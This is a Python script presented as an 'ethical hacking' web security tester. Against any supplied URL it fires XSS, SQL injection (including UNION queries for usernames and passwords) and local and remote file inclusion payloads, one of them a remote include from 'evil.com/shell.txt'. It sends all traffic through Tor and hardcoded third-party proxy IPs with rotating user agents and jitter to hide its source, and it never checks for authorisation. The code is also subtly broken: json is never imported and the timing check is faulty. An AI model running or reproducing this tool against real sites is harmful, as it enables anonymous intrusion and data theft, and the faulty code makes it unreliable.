#!/usr/bin/env python3
"""
ULTIMATE WEB SECURITY TESTING TOOL
Features:
- Advanced vulnerability scanning
- Proxy chaining with authentication
- Multi-threaded execution
- Comprehensive reporting
- Ethical hacking focused
"""

import os
import sys
import requests
import random
import time
import socket
import socks
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import argparse
import hashlib

# ===== CONFIGURATION =====
MAX_THREADS = 20
REQUEST_TIMEOUT = 10
RETRY_COUNT = 2
JITTER = (0.5, 1.5)  # Random delay between requests

# ===== PROXY CONFIGURATION =====
PROXY_LIST = [
    'socks5://localhost:9050',  # Tor
    'http://127.0.0.1:8080',    # Local proxy
    'https://proxy.example.com:443',
    'socks5://user:pass@proxy.example.com:1080',
    'socks4://45.155.68.129:5678',
    'http://user:pass@proxy.example.com:3128',
    'http://45.61.187.67:8000',
    'http://geo.provider.com:8888',
    'socks5://user:pass@residential.proxy.net:9050',
    'http://185.199.229.156:7492',
    'http://194.163.131.162:3128',
    'socks5://51.15.242.202:8888',
    'http://scraperapi.com:8000',
    'socks5://pro.webshare.io:1234'
]

# ===== COLOR CODING =====
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# ===== VULNERABILITY TESTING =====
class SecurityTester:
    def __init__(self):
        self.proxy_engine = ProxyEngine()
        self.session = self._create_session()
        self.results = []
        
    def _create_session(self):
        """Create configured requests session"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Linux; Android 10; SM-G975F)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
            ]),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        return session
        
    def _random_delay(self):
        """Add jitter between requests"""
        time.sleep(random.uniform(*JITTER))
        
    def _try_request(self, method, url, **kwargs):
        """Make request with error handling"""
        for attempt in range(RETRY_COUNT):
            proxy = self.proxy_engine.get_random_proxy()
            if not proxy:
                print(f"{Colors.RED}[!] No working proxies available{Colors.RESET}")
                return None
                
            proxies = {'http': proxy, 'https': proxy}
            try:
                self._random_delay()
                response = self.session.request(
                    method,
                    url,
                    proxies=proxies,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=False,
                    **kwargs
                )
                return response
            except Exception as e:
                continue
        return None
        
    def test_xss(self, url):
        """Test for XSS vulnerabilities"""
        test_params = {
            'q': 'test',
            'search': 'test',
            'id': '1',
            'user': 'test'
        }
        
        for param, value in test_params.items():
            for payload in [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                'javascript:alert(1)'
            ]:
                test_url = f"{url}?{param}={payload}"
                response = self._try_request('GET', test_url)
                if response and payload in response.text:
                    self.results.append({
                        'type': 'XSS',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True
        return False
        
    def test_sqli(self, url):
        """Test for SQL injection vulnerabilities"""
        for payload in [
            "' OR 1=1--",
            "' OR 'a'='a",
            "admin'--",
            "' UNION SELECT null,username,password FROM users--",
            "' WAITFOR DELAY '0:0:5'--"
        ]:
            test_url = f"{url}?id={payload}"
            response = self._try_request('GET', test_url)
            
            if response:
                # Error-based detection
                if any(error in response.text.lower() for error in ['sql', 'syntax', 'error']):
                    self.results.append({
                        'type': 'SQLi',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True
                
                # Time-based detection
                start_time = time.time()
                time_payload = f"1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)"
                time_url = f"{url}?id={time_payload}"
                self._try_request('GET', time_url)
                if time.time() - start_time > 4:
                    self.results.append({
                        'type': 'Blind SQLi',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True
        return False
        
    def test_file_inclusion(self, url):
        """Test for LFI/RFI vulnerabilities"""
        for payload in [
            '../../../../etc/passwd',
            'file:///etc/passwd',
            'http://evil.com/shell.txt'
        ]:
            test_url = urljoin(url, f"?file={payload}")
            response = self._try_request('GET', test_url)
            if response and ('root:' in response.text or '<?php' in response.text):
                self.results.append({
                    'type': 'File Inclusion',
                    'url': test_url,
                    'payload': payload,
                    'severity': 'High'
                })
                return True
        return False

# ===== PROXY MANAGEMENT =====
class ProxyEngine:
    def __init__(self):
        self.proxies = PROXY_LIST
        self.working_proxies = []
        self._test_proxies()
        
    def _test_proxies(self):
        """Test and filter working proxies"""
        test_url = "http://httpbin.org/ip"
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self._test_proxy, proxy): proxy for proxy in self.proxies}
            for future in as_completed(futures):
                proxy = futures[future]
                try:
                    if future.result():
                        self.working_proxies.append(proxy)
                        print(f"{Colors.GREEN}[+] Proxy working: {proxy}{Colors.RESET}")
                except Exception:
                    print(f"{Colors.RED}[-] Proxy failed: {proxy}{Colors.RESET}")
        
    def _test_proxy(self, proxy):
        """Test individual proxy"""
        try:
            proxies = {'http': proxy, 'https': proxy}
            response = requests.get(
                "http://httpbin.org/ip",
                proxies=proxies,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
            
    def get_random_proxy(self):
        """Get a random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)

# ===== MAIN EXECUTION =====
def main():
    parser = argparse.ArgumentParser(description="Advanced Web Security Tester")
    parser.add_argument("url", help="Target URL to test")
    parser.add_argument("--output", help="Output file for results")
    args = parser.parse_args()

    tester = SecurityTester()
    
    if not tester.proxy_engine.working_proxies:
        print(f"{Colors.RED}[!] No working proxies available!{Colors.RESET}")
        return
        
    print(f"{Colors.CYAN}[*] Starting security tests on {args.url}{Colors.RESET}")
    
    # Run all tests
    tests = [
        ('XSS', tester.test_xss),
        ('SQLi', tester.test_sqli),
        ('File Inclusion', tester.test_file_inclusion)
    ]
    
    for name, test_func in tests:
        print(f"{Colors.BLUE}[*] Testing for {name}...{Colors.RESET}")
        if test_func(args.url):
            print(f"{Colors.GREEN}[+] {name} vulnerability found!{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[-] No {name} found{Colors.RESET}")
    
    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(tester.results, f, indent=2)
        print(f"{Colors.GREEN}[+] Results saved to {args.output}{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}[*] Test complete{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Vulnerabilities found: {len(tester.results)}{Colors.RESET}")

if __name__ == "__main__":
    BANNER = f"""{Colors.PURPLE}
     ____ _   _ ___ _____ ___ _   _ ____  _____ _   _ _____ 
    / ___| | | |_ _|  ___|_ _| \ | |  _ \| ____| \ | |_   _|
    | |   | | | || || |_   | ||  \| | | | |  _| |  \| | | |  
    | |___| |_| || ||  _|  | || |\  | |_| | |___| |\  | | |  
    \____|\___/|___|_|   |___|_| \_|____/|_____|_| \_| |_|  
    
    Advanced Web Security Testing Tool
    {Colors.RESET}"""
    print(BANNER)
    main()
